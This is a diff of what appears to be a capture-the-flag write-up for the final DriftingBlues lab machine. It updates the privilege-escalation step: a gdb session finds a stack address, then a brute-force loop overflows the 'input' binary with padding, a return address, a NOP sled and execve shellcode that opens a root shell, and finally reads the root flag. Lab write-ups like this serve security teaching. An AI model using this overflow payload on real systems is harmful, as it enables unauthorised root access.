@@ -231,12 +231,20 @@ for i in {1..10000}; do (./input $(python -c 'print "A" * 171 + "\xa0\xe4\xff\xb
 
 0xbffe48a0:
 ```c
-r $(python -c 'print("A"*171 + "\xa0\xe4\xff\xbf" + "\x90"*64 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")')
+clapton@debian:~$ gdb -q input
+(gdb) run $(python2 -c 'print "A"*171 + "B"*4 + "\x90"*500')
+
+(gdb) x/ws $esp
+x/ws $esp
+0xbffe48a0:     U'\x90909090' <repeats 125 times>
+
+clapton@debian:~$ for i in {1..10000}; do (./input $(python -c 'print "A" * 171 + "\xa0\xe4\xff\xbf" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')); done
+<7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'));done
 ```
 
 ```css
-# cat root.txt
-cat root.txt
+# cat /root/root.txt
+cat /root/root.txt
    
 this is the final of driftingblues series. i hope you've learned something from them.
 
